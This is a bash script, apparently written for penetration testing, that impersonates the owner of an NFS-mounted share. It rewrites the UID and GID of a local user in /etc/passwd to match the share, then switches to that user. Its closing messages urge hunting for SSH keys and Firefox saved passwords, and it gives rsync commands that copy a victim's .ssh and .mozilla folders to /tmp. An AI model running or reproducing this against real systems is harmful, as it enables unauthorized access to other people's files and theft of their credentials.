#!/bin/bash
### Script to output the specific user and group id for an NFS mounted share folder
### Then modify a user already established as the last added user, and su to the user
### Version 2 (modified after on site assessment) 03/20/2019 @ 0800PDT
### by @ellwoodthewood


### Adding color to text
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

printf "$RED Ensure you have already mounted the NFS share, and added a user as the last entry in /etc/passwd $NC \r\n"
printf "Please enter the NFS directory path to change to (run this from the mount point for ease of use): "
read nfsdir

### grabing the group and user id's from the output of ls
### Have noticed if it's already a match, it will do funky things to /etc/passwd, due to matching a name instead of numeric value
USER=$(ls -ld $nfsdir | awk '{print $3}')
GROUP=$(ls -ld $nfsdir | awk '{print $4}')
echo "The permissions are user: $USER and group: $GROUP"

printf "Please enter the already established user on the local box to SU to: "
read suuser

### Grab the current user and group id's
SUUSERID=$(cat /etc/passwd |grep $suuser |cut -d ':' -f 3)
SUGROUID=$(cat /etc/passwd |grep $suuser |cut -d ':' -f 4)

printf "The current $suuser permissions are user: $SUUSERID and group: $SUGROUID \r\n"

### Backup the current file in case we royaly screw something in sed
cp /etc/passwd /etc/passwd.old

### Change the last line only, which should contain the user noted above to the permissions needed for the nfs folder
sed -i "$ s/$SUUSERID:$SUGROUID/$USER:$GROUP/g" /etc/passwd


echo "The new user and group ID is: "
cat /etc/passwd |grep $suuser
echo ""
echo "$YELLOW-You can now enter the directory. Remember to look for .ssh folder and keys, and firefox profile data for saved passwords!- $NC"

printf "Alternatively, could run a sudo -c 'command here' command instead, if for instance you wanted to copy out the firefox profile data, or ssh keys and not bother with su.\r\n"
printf "Something like: sudo -H -u $suuser bash -c 'rsync -rv $nfsdir/.ssh/ /tmp/$nfsdir/' and/or sudo -H -u $suuser bash -c 'rsync -rv $nfsdir/.mozilla/ /tmp/$nfsdir/' \r\n"

su - $suuser
